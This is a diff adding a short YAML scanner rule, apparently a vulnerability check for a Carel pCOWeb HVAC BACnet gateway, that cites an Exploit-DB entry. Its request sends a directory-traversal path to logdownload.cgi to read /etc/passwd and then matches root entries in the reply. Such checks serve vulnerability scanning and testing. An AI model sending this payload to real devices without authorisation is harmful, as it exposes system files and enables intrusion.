@@ -1,0 +1,11 @@
+name: carel-pcoweb-hvac-bacnet-getway
+rules:
+  r0:
+    request:
+      method: GET
+      path: /usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
+detail:
+  links:
+    - https://www.exploit-db.com/exploits/50986
